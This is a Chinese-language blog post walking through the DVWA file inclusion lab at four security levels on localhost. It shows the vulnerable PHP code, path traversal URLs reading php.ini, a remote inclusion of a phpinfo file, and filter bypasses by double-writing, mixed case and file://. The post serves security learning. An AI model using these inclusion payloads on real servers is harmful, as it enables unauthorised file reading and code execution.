@@ -1,0 +1,232 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>DVWA-File | 墨水彩笔</title><meta name="author" content="徐小宇"><meta name="copyright" content="徐小宇"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="description" content="第一部分（File Inclusion）介绍File Inclusion:File Inclusion，意思是文件包含（漏洞），是指当服务器开启allow_url_include选项时，就可以通过php的某些特性函数（include()，require()和include_once()，require_once()）利用url去动态包含文件，此时如果没有对文件来源进行严格审查，就会导致任意文件读取">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DVWA-File">
+<meta property="og:url" content="http://example.com/2021/02/26/DVWA-File/index.html">
+<meta property="og:site_name" content="墨水彩笔">
+<meta property="og:description" content="第一部分（File Inclusion）介绍File Inclusion:File Inclusion，意思是文件包含（漏洞），是指当服务器开启allow_url_include选项时，就可以通过php的某些特性函数（include()，require()和include_once()，require_once()）利用url去动态包含文件，此时如果没有对文件来源进行严格审查，就会导致任意文件读取">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg">
+<meta property="article:published_time" content="2021-02-26T02:37:09.000Z">
+<meta property="article:modified_time" content="2021-02-26T04:26:57.306Z">
+<meta property="article:author" content="徐小宇">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2021/02/26/DVWA-File/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  hexoversion: '5.2.0',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: 'Just',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  ClickShowText: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  justifiedGallery: {
+    js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+    css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+};
+
+var saveToLocal = {
+  set: function setWithExpiry(key, value, ttl) {
+    const now = new Date()
+    const expiryDay = ttl * 86400000
+    const item = {
+      value: value,
+      expiry: now.getTime() + expiryDay,
+    }
+    localStorage.setItem(key, JSON.stringify(item))
+  },
+
+  get: function getWithExpiry(key) {
+    const itemStr = localStorage.getItem(key)
+
+    if (!itemStr) {
+      return undefined
+    }
+    const item = JSON.parse(itemStr)
+    const now = new Date()
+
+    if (now.getTime() > item.expiry) {
+      localStorage.removeItem(key)
+      return undefined
+    }
+    return item.value
+  }
+}</script><script id="config_change">var GLOBAL_CONFIG_SITE = { 
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isSidebar: true,
+  postUpdate: '2021-02-26 12:26:57'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(function () {
+  window.activateDarkMode = function () {
+    document.documentElement.setAttribute('data-theme', 'dark')
+    if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+    }
+  }
+  window.activateLightMode = function () {
+    document.documentElement.setAttribute('data-theme', 'light')
+    if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+    }
+  }
+
+  const autoChangeMode = 'false'
+  const t = saveToLocal.get('theme')
+  if (autoChangeMode === '1') {
+    const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+    const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+    const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+    const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+
+    if (t === undefined) {
+      if (isLightMode) activateLightMode()
+      else if (isDarkMode) activateDarkMode()
+      else if (isNotSpecified || hasNoSupport) {
+        const now = new Date()
+        const hour = now.getHours()
+        const isNight = hour <= 6 || hour >= 18
+        isNight ? activateDarkMode() : activateLightMode()
+      }
+      window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
+        if (saveToLocal.get('theme') === undefined) {
+          e.matches ? activateDarkMode() : activateLightMode()
+        }
+      })
+    } else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else if (autoChangeMode === '2') {
+    const now = new Date()
+    const hour = now.getHours()
+    const isNight = hour <= 6 || hour >= 18
+    if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
+    else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else {
+    if (t === 'dark') activateDarkMode()
+    else if (t === 'light') activateLightMode()
+  }
+})()</script><meta name="generator" content="Hexo 5.2.0"></head><body><div id="mobile-sidebar"><div id="menu_mask"></div><div id="mobile-sidebar-menus"><div class="mobile_author_icon"><img class="avatar-img" src="/null" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="mobile_post_data"><div class="mobile_data_item is-center"><div class="mobile_data_link"><a href="/archives/"><div class="headline">Articles</div><div class="length_num">18</div></a></div></div></div><hr/></div></div><div id="body-wrap"><div id="sidebar"><i class="fas fa-arrow-right on" id="toggle-sidebar"></i><div class="sidebar-toc"><div class="sidebar-toc__title">Catalog</div><div class="sidebar-toc__progress"><span class="progress-notice">You've read</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar">     </div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E9%83%A8%E5%88%86%EF%BC%88File-Inclusion%EF%BC%89"><span class="toc-number">1.</span> <span class="toc-text">第一部分（File Inclusion）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%8B%E7%BB%8DFile-Inclusion"><span class="toc-number">1.0.1.</span> <span class="toc-text">介绍File Inclusion:</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#lOW"><span class="toc-number">2.</span> <span class="toc-text">lOW</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%EF%BC%9A"><span class="toc-number">2.0.0.1.</span> <span class="toc-text">代码分析：</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%BC%95%E5%85%A5%EF%BC%9A"><span class="toc-number">2.0.0.1.1.</span> <span class="toc-text">引入：</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E6%93%8D%EF%BC%9A"><span class="toc-number">2.0.0.2.</span> <span class="toc-text">实操：</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%8F%92%E5%85%A5%EF%BC%9A"><span class="toc-number">2.0.0.2.1.</span> <span class="toc-text">插入：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#4-%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E7%9A%84%E4%B8%8D%E5%90%8C%E6%96%B9%E6%B3%95%EF%BC%9A"><span class="toc-number">2.0.0.2.2.</span> <span class="toc-text">4.读取文件的不同方法：</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%9A"><span class="toc-number">3.</span> <span class="toc-text">远程文件包含：</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E6%93%8D%EF%BC%9A-1"><span class="toc-number">3.1.</span> <span class="toc-text">实操：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Medium"><span class="toc-number">4.</span> <span class="toc-text">Medium</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%EF%BC%9A-1"><span class="toc-number">4.0.1.</span> <span class="toc-text">代码分析：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E6%93%8D%EF%BC%9A-2"><span class="toc-number">4.0.2.</span> <span class="toc-text">实操：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#High"><span class="toc-number">5.</span> <span class="toc-text">High</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%EF%BC%9A-2"><span class="toc-number">5.0.0.1.</span> <span class="toc-text">代码分析：</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Impossible"><span class="toc-number">6.</span> <span class="toc-text">Impossible</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%84%E5%91%8A%E7%89%87"><span class="toc-number">6.0.1.</span> <span class="toc-text">预告片</span></a></li></ol></li></ol></li></ol></div></div></div><header class="post-bg" id="page-header" style="background-image: url(https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg)"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">墨水彩笔</a></span><span id="menus"><span class="close" id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></span></span></nav><div id="post-info"><div id="post-title"><div class="posttitle">DVWA-File</div></div><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2021-02-26T02:37:09.000Z" title="Created 2021-02-26 10:37:09">2021-02-26</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2021-02-26T04:26:57.306Z" title="Updated 2021-02-26 12:26:57">2021-02-26</time></span></div><div class="meta-secondline"> <span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout_post" id="content-inner"><article id="post"><div class="post-content" id="article-container"><h1 id="第一部分（File-Inclusion）"><a href="#第一部分（File-Inclusion）" class="headerlink" title="第一部分（File Inclusion）"></a>第一部分（File Inclusion）</h1><h3 id="介绍File-Inclusion"><a href="#介绍File-Inclusion" class="headerlink" title="介绍File Inclusion:"></a>介绍File Inclusion:</h3><p>File Inclusion，意思是文件包含（漏洞），是指当服务器开启allow_url_include选项时，就可以通过php的某些特性函数（include()，require()和include_once()，require_once()）利用url去动态包含文件，此时如果没有对文件来源进行严格审查，就会导致任意文件读取或者任意命令执行。文件包含漏洞分为本地文件包含漏洞与远程文件包含漏洞，远程文件包含漏洞是因为开启了php配置中的allow_url_fopen选项（选项开启之后，服务器允许包含一个远程的文件）。</p>
+<h1 id="lOW"><a href="#lOW" class="headerlink" title="lOW"></a>lOW</h1><h4 id="代码分析："><a href="#代码分析：" class="headerlink" title="代码分析："></a>代码分析：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">$file &#x3D; $_GET[ &#39;page&#39; ];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这段代码，没有进行任何的过滤。</p>
+<h5 id="引入："><a href="#引入：" class="headerlink" title="引入："></a>引入：</h5><p>可以看到，服务器端对page参数没有做任何的过滤跟检查。</p>
+<p>服务器期望用户的操作是点击下面的三个链接，服务器会包含相应的文件，并将结果返回。需要特别说明的是，服务器包含文件时，不管文件后缀是否是php，都会尝试当做php文件执行，如果文件内容确为php，则会正常执行并返回结果，如果不是，则会原封不动地打印文件内容，所以文件包含漏洞常常会导致任意文件读取与任意命令执行。</p>
+<h4 id="实操："><a href="#实操：" class="headerlink" title="实操："></a>实操：</h4><p>1.任意点开一个file后我们发现了URL的变化仅仅体现在page后面的内容。</p>
+<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/image-20210226104431876.png?raw=true" alt="image-20210226104431876.png"></p>
+<p>2.构造一个url：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;DVWA&#x2F;vulnerabilities&#x2F;fi&#x2F;?page&#x3D;&#x2F;etc&#x2F;shdow(这条语句可以为任意语句)</span><br></pre></td></tr></table></figure>
+
+<p>发现网页报错，并且报错的内容中含有<strong>绝对路径</strong></p>
+<h5 id="插入："><a href="#插入：" class="headerlink" title="插入："></a>插入：</h5><p>如果发现你的网页没有报错的话：</p>
+<p>原因为php.ini（这个文件的路径不再DVWA中，eg：我的路径是通过phpstudy-&gt;设置-&gt;文件位置打开找到的）中错误提醒功能关闭，我们只要开启即可找到display_errors = Off 修改display_errors = On）</p>
+<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/image-20210226104847016.png?raw=true" alt="image-20210226104847016.png"></p>
+<p>3.读取服务器文件：</p>
+<p>构造url：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//localhost/DVWA/vulnerabilities/fi/page=C:\php\phpstudy_pro\WWW\DVWA\php.ini</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/image-20210226105905969.png?raw=true" alt="image-20210226105905969.png"></p>
+<p>注意点：</p>
+<p>a.关于路径问题：我们可以看到报错中给出的绝对路径为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\php\phpstudy_pro\WWW\DVWA\dvwa\includes\dvwaPage.inc.php</span><br><span class="line">（但我们在编写查看php.ini的时候只到了C:\php\phpstudy_pro\WWW\DVWA）说明了说明，这是一个概念，我们爆出的路径不一定是处于根目录，于是我们逐个去删减后达到php.ini所在的目录位置。</span><br></pre></td></tr></table></figure>
+
+<p>b.这一行的信息，就是为什么我们可以使用上传漏洞（可以回看一下上传漏洞的介绍）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">This file attempts to overwrite the original php.ini file. Doesnt always work. magic_quotes_gpc &#x3D; Off allow_url_fopen &#x3D; on allow_url_include &#x3D; on </span><br></pre></td></tr></table></figure>
+
+<h5 id="4-读取文件的不同方法："><a href="#4-读取文件的不同方法：" class="headerlink" title="4.读取文件的不同方法："></a>4.读取文件的不同方法：</h5><p>方式一：构造url（相对路径），先介绍一下知识点：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F; 		根目录</span><br><span class="line">.&#x2F;		是当前目录</span><br><span class="line">..&#x2F;  返回到上一级目录</span><br><span class="line">..&#x2F;..&#x2F; 返回了两级目录</span><br><span class="line">.\ 、..\和.&#x2F;、..&#x2F;意义相同</span><br></pre></td></tr></table></figure>
+
+<p>这种方法类似于盲注（个人感觉）。</p>
+<p>当我构造Url为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;DVWA&#x2F;vulnerabilities&#x2F;fi&#x2F;?page&#x3D;..&#x2F;..&#x2F;\php.ini</span><br></pre></td></tr></table></figure>
+
+<p>这时出现了与构造绝对url相同的内容。</p>
+<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/image-20210226110917731.png?raw=true" alt="image-20210226110917731.png"></p>
+<p>方法二：%00截断</p>
+<p>有两个条件：1.在php版本小于5.3.4的服务器中    2.当Magic_quote_gpc选项为off时</p>
+<p>可以参考：</p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/119150.html">https://www.freebuf.com/articles/web/119150.html</a></p>
+<h1 id="远程文件包含："><a href="#远程文件包含：" class="headerlink" title="远程文件包含："></a>远程文件包含：</h1><p>当服务器的php配置中，选项allow_url_fopen与allow_url_include为开启状态时，服务器会允许包含远程服务器上的文件，如果对文件来源没有检查的话，就容易导致任意远程代码执行。</p>
+<h2 id="实操：-1"><a href="#实操：-1" class="headerlink" title="实操："></a>实操：</h2><p>首先我们需要先上传一个文件（网上是这么说的，但我的做法是创造一个文件）。需要注意的是这个文件所在的位置很重要如果不在我们的环境（我的是phpstudy，测试最少放在www内）下的话是无法被调用的。</p>
+<p>因此我们创造一个文件内容为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?</span><br><span class="line">phpinfo();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>然后将其调用：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;DVWA&#x2F;vulnerabilities&#x2F;fi&#x2F;?page&#x3D;http:&#x2F;&#x2F;localhost&#x2F;123.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/image-20210226112323414.png?raw=true" alt="image-20210226112323414.png"></p>
+<h1 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h1><h3 id="代码分析：-1"><a href="#代码分析：-1" class="headerlink" title="代码分析："></a>代码分析：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$file &#x3D; str_replace( array( &quot;http:&#x2F;&#x2F;&quot;, &quot;https:&#x2F;&#x2F;&quot; ), &quot;&quot;, $file );</span><br><span class="line">$file &#x3D; str_replace( array( &quot;..&#x2F;&quot;, &quot;..\&quot;&quot; ), &quot;&quot;, $file );</span><br></pre></td></tr></table></figure>
+
+<p>str_replace，我们已经见过很多次了，就是将指定的字符转变。</p>
+<p>常用的绕过方式为：</p>
+<p>1.双写；    2.大小写；</p>
+<h3 id="实操：-2"><a href="#实操：-2" class="headerlink" title="实操："></a>实操：</h3><p>1.构造绝对路径url（不会受到阻碍）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;DVWA&#x2F;vulnerabilities&#x2F;fi&#x2F;?page&#x3D;C:\php\phpstudy_pro\WWW\DVWA\php.ini</span><br></pre></td></tr></table></figure>
+
+<p>2.构造相对路径url（需要使用绕过）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;DVWA&#x2F;vulnerabilities&#x2F;fi&#x2F;?page&#x3D;...&#x2F;.&#x2F;...&#x2F;.&#x2F;\php.ini</span><br></pre></td></tr></table></figure>
+
+<p>3.远程文件包含：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;DVWA&#x2F;vulnerabilities&#x2F;fi&#x2F;?page&#x3D;htthttp:&#x2F;&#x2F;p:&#x2F;&#x2F;localhost&#x2F;123.txt</span><br></pre></td></tr></table></figure>
+
+<p>注意这里我们双写绕过。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;DVWA&#x2F;vulnerabilities&#x2F;fi&#x2F;?page&#x3D;HttP:&#x2F;&#x2F;localhost&#x2F;123.txt</span><br></pre></td></tr></table></figure>
+
+<p>大小写绕过也可以执行。</p>
+<h1 id="High"><a href="#High" class="headerlink" title="High"></a>High</h1><h4 id="代码分析：-2"><a href="#代码分析：-2" class="headerlink" title="代码分析："></a>代码分析：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">if(!function_exists(&#39;fnmatch&#39;)) &#123;</span><br><span class="line">   function fnmatch($pattern, $string) &#123;</span><br><span class="line">     return preg_match(&quot;#^&quot;.strtr(preg_quote($pattern, &#39;#&#39;),array(&#39;\*&#39; &#x3D;&gt; &#39;.*&#39;, &#39;\?&#39;&#x3D;&gt; &#39;.&#39;)).&quot;$#i&quot;, $string); </span><br><span class="line">     &#125; &#x2F;&#x2F; end</span><br><span class="line">&#125; &#x2F;&#x2F; end if</span><br><span class="line">&#x2F;&#x2F; The page we wish to display</span><br><span class="line">$file &#x3D; $_GET[ &#39;page&#39; ];</span><br><span class="line">if( !fnmatch( &quot;file*&quot;, $file ) &amp;&amp; $file !&#x3D; &quot;include.php&quot; ) &#123;</span><br><span class="line">    &#x2F;&#x2F; This isn&#39;t the page we want!</span><br><span class="line">    echo &quot;ERROR: File not found!&quot;;</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
+
+<p>fnmatch() 函数：根据指定的模式来匹配文件名或字符串。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fnmatch(pattern,string,flags)</span><br><span class="line">pattern	必需。规定要检索的模式。</span><br><span class="line">string	必需。规定要检查的字符串或文件。</span><br><span class="line">flags	可选。</span><br></pre></td></tr></table></figure>
+
+<p>那么我们根据代码的意思（fnmatch( “file*”, $file )）可以理解为，必须match到file字符</p>
+<p>（可以看到，High级别的代码使用了fnmatch函数检查page参数，要求page参数的开头必须是file，服务器才会去包含相应的文件。）</p>
+<p>1.构造绝对url：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;DVWA&#x2F;vulnerabilities&#x2F;fi&#x2F;?page&#x3D;file:&#x2F;&#x2F;&#x2F;C:\php\phpstudy_pro\WWW\DVWA\php.ini</span><br></pre></td></tr></table></figure>
+
+<p>2.构造相对url：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;DVWA&#x2F;vulnerabilities&#x2F;fi&#x2F;?page&#x3D;file:&#x2F;..&#x2F;..&#x2F;..&#x2F;\php.ini</span><br></pre></td></tr></table></figure>
+
+<p>3.远程文件包含：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;DVWA&#x2F;vulnerabilities&#x2F;fi&#x2F;?page&#x3D;file:&#x2F;&#x2F;&#x2F;C:\php\phpstudy_pro\WWW\123.txt</span><br></pre></td></tr></table></figure>
+
+<h1 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a>Impossible</h1><p>代码分析：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$file = $_GET[ <span class="string">&#x27;page&#x27;</span> ];</span><br><span class="line"><span class="keyword">if</span>( $file != <span class="string">&quot;include.php&quot;</span> &amp;&amp; $file != <span class="string">&quot;file1.php&quot;</span> &amp;&amp; $file != <span class="string">&quot;file2.php&quot;</span> &amp;&amp; $file != <span class="string">&quot;file3.php&quot;</span> ) &#123;</span><br><span class="line">    <span class="comment">// This isn&#x27;t the page we want!</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;ERROR: File not found!&quot;</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+
+<p>我们可以看出这里是使用了<strong>白名单</strong>的方法，只允许访问网页中的file1.2.3这三个文件。</p>
+<h3 id="预告片"><a href="#预告片" class="headerlink" title="预告片"></a>预告片</h3><p>请学习完file inclusion后进行file upload更佳。</p>
+</div><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">徐小宇</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://example.com/2021/02/26/DVWA-File/">http://example.com/2021/02/26/DVWA-File/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2021/02/22/DVWA-CSRF/"><img class="next-cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">DVWA-CSRF</div></div></a></div></nav></article></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By 徐小宇</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><section id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></section><div><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><div class="js-pjax"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></div></body></html>
